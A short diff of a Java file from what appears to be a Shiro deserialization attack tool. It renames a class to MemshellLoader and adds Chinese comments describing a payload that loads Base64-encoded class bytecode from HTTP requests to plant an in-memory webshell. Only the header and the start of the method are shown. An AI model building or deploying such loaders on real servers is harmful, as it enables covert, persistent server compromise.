@@ -3,14 +3,23 @@
  * Source: https://github.com/SummerSec/ShiroAttack2/blob/master/src/main/java/com/summersec/attack/deser/plugins/InjectMemTool.java
  */
 
-package com.y5neko.shiroexp.gadget;
+package com.y5neko.shiroexp.payloads;
 
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 import javassist.CtNewConstructor;
 
-public class MemInject {
+/**
+ * 内存马加载器
+ * 生成动态类加载器 payload，从 HTTP 请求中读取 Base64 编码的类字节码并加载执行
+ */
+public class MemshellLoader {
+    /**
+     * 生成内存马加载器 payload
+     * @param pool Javassist ClassPool
+     * @return CtClass 可被 TemplatesImpl 加载的恶意类
+     */
     public CtClass genPayload(ClassPool pool) throws Exception {
         CtClass clazz = pool.makeClass("com.y5neko.Security" + System.nanoTime());
 
